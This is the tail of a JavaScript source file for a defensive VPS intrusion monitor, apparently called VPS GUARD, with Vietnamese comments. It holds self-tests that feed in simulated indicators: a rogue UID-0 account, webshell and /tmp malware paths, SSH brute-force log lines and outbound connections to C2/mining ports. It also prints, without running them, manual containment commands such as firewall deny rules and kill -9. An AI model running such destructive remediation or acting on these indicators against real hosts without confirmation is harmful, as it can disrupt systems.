  check("cổng đã có trong baseline im lặng", scanListeners('udp UNCONN 0 0 0.0.0.0:40559 0.0.0.0:* users:(("MainThread",pid=6,fd=1))', { known: ["udp:40559"] }).length === 0);
  check("UDP cổng mới của tiến trình đã biết chỉ ghi nhận LOW", scanListeners('udp UNCONN 0 0 0.0.0.0:41001 0.0.0.0:* users:(("hysteria",pid=6,fd=1))', { known: [], knownProcesses: ["hysteria"] }).every((f) => f.severity === "low"));
  check("UDP cổng mới của tiến trình LẠ bị báo MEDIUM", scanListeners('udp UNCONN 0 0 0.0.0.0:41001 0.0.0.0:* users:(("lạ",pid=6,fd=1))', { known: [], knownProcesses: ["hysteria"] }).some((f) => f.severity === "medium"));
  check("cổng 53 nội bộ của systemd-resolved im lặng", scanListeners('udp UNCONN 0 0 127.0.0.53:53 0.0.0.0:* users:(("systemd-resolve",pid=7,fd=1))').length === 0);
  check("cổng lạ ra ngoài bị báo", scanListeners('tcp LISTEN 0 128 0.0.0.0:8081 0.0.0.0:* users:(("x",pid=8,fd=1))').some((f) => f.id === "listen-8081" && f.severity === "medium"));
  check("kết nối ra lấy ĐÚNG cột peer (4444)", scanOutbound("tcp ESTAB 0 0 10.0.0.1:55555 37.1.2.3:4444").some((f) => f.id === "out-4444"));
  check("không nhầm cổng local thành peer", scanOutbound("tcp ESTAB 0 0 10.0.0.1:4444 1.1.1.1:443").length === 0);
  check("brute-force SSH bị báo (gộp 1 tin)", scanSshBruteForce(Array.from({ length: 40 }, () => "Failed password for root from 9.9.9.9 port 22 ssh2").join("\n")).some((f) => f.id === "ssh-brute-wave"));
  check("brute-force nhiều IP chỉ ra 1 phát hiện", scanSshBruteForce([
    ...Array.from({ length: 35 }, () => "Failed password for root from 9.9.9.9 port 22 ssh2"),
    ...Array.from({ length: 31 }, () => "Failed password for root from 8.8.8.8 port 22 ssh2"),
  ].join("\n")).length === 1);
  check("dưới ngưỡng thì không báo", scanSshBruteForce(Array.from({ length: 5 }, () => "Failed password for root from 9.9.9.9 port 22 ssh2").join("\n")).length === 0);
  check("webshell bị báo", scanSuspiciousFiles("/var/www/html/x.php").some((f) => f.id.startsWith("file-webshell")));
  check("malware /tmp/kwork bị báo", scanSuspiciousFiles("/tmp/kwork").some((f) => f.id.startsWith("file-malware")));
  check("binary trong /tmp bị báo", scanSuspiciousFiles("/tmp/.x/payload.elf").some((f) => f.id.startsWith("file-exec-tmp")));
  check("tệp trọng yếu bị sửa thì báo", diffHashes({ "/etc/passwd": "aaa" }, { "/etc/passwd": "bbb" }).some((f) => f.id.startsWith("integrity-changed")));
  check("UID 0 lạ bị báo", scanAccounts("hacker:x:0:0::/root:/bin/bash\nroot:x:0:0::/root:/bin/bash", "", []).some((f) => f.id === "acct-uid0"));
  check("root login IP mới bị báo (parse đúng cột IP)", scanAccounts("root:x:0:0::/root:/bin/bash", "root pts/0 Tue Sep 8 21:17 - 23:32 (02:15) 103.173.155.50", []).some((f) => f.title.includes("103.173.155.50")));
  check("cron mới bị báo", diffNewItems("cron", ["cũ"], ["cũ", "mới"]).some((f) => f.id.startsWith("new-cron")));
  check("log gộp cổng UDP tạm thành 1 dòng", summarizeForLog([
    finding("listen-1", "low", "Cổng 1 đang MỞ (udp, ra ngoài)", 'Cổng UDP tạm do "hysteria" (đã có trong baseline) mở — chỉ ghi nhận.', "l"),
    finding("listen-2", "low", "Cổng 2 đang MỞ (udp, ra ngoài)", 'Cổng UDP tạm do "hysteria" (đã có trong baseline) mở — chỉ ghi nhận.', "l"),
  ]).join("\n").includes("2 cổng UDP tạm"));
  check("chống trùng phát hiện", dedupe([finding("x", "high", "t", "d", "e"), finding("x", "high", "t", "d", "e")]).length === 1);
  check("tin cảnh báo có tiêu đề + hướng xử lý", /VPS GUARD/.test(formatAlert([finding("x", "high", "Thử", "Chi tiết")])) && /VPS-DEFENSE/.test(formatAlert([finding("x", "high", "Thử", "Chi tiết")])));

  const failed = cases.filter((c) => !c.ok);
  console.log(`\n${cases.length - failed.length}/${cases.length} mục đạt`);
  return failed.length === 0;
}

/** In hướng dẫn ngăn chặn cho 1 id — KHÔNG tự thực thi. */
function contain(id) {
  if (!id) { console.error("Thiếu id cần xử lý. Ví dụ: --contain ssh-brute-<hash>"); process.exit(1); }
  log(`CONTAIN(yêu cầu xem hướng dẫn) ${id} bởi ${os.userInfo().username}`);
  if (id.startsWith("ssh-brute")) {
    console.log("Chặn IP brute-force (chạy tay sau khi xác nhận IP xấu):");
    console.log("  ufw deny from <IP> to any");
    console.log("  nft add rule inet filter input ip saddr <IP> drop");
  } else if (id === "proc-malware" || id.startsWith("file-")) {
    console.log("Cách ly mẫu TRƯỚC khi kill (tệp đã bị xoá vẫn đọc được qua /proc):");
    console.log("  ls -la /proc/<PID>/exe; cp /proc/<PID>/exe /root/quarantine-<PID>; kill -9 <PID>");
  } else if (id.startsWith("listen-") || id.startsWith("new-systemd")) {
    console.log("Dừng dịch vụ lạ rồi soi unit:");
    console.log("  systemctl stop <unit>; systemctl disable <unit>; systemctl cat <unit>; journalctl -u <unit> -n 100");
  } else if (id.startsWith("out-")) {
    console.log("Chặn hướng ra tới pool/C2 hay gặp:");
    console.log("  ufw deny out to any port 3333,4444,5555,7777,14444 proto tcp");
  } else {
    console.log("Xem docs/VPS-DEFENSE.md mục 4 (Xử lý sự cố) để xử lý theo loại phát hiện.");
  }
}

// ------------------------------------------------------------------ main

const isMain = process.argv[1] && path.resolve(process.argv[1]) === path.resolve(fileURLToPath(import.meta.url));
if (isMain) {
  if (has("--test")) process.exit(selfTest() ? 0 : 1);
  if (has("--baseline")) { chotBaseline(); process.exit(0); }
  if (has("--contain")) { contain(valueOf("--contain")); process.exit(0); }
  if (has("--alert-test")) {
    const text = formatAlert([finding("test", "high", "Tin thử của VPS GUARD", "Nếu anh nhận được tin này, kênh cảnh báo Telegram + agent-bus đã thông.")]);
    const [tg, bus] = [await sendTelegram(text), await sendBus(text)];
    console.log(`alert-test: telegram=${tg} bus=${bus}`);
    process.exit(tg || bus ? 0 : 1);
  }
  const worst = await runOnce();
  process.exit(SEV[worst] >= SEV.high ? 2 : 0);
}
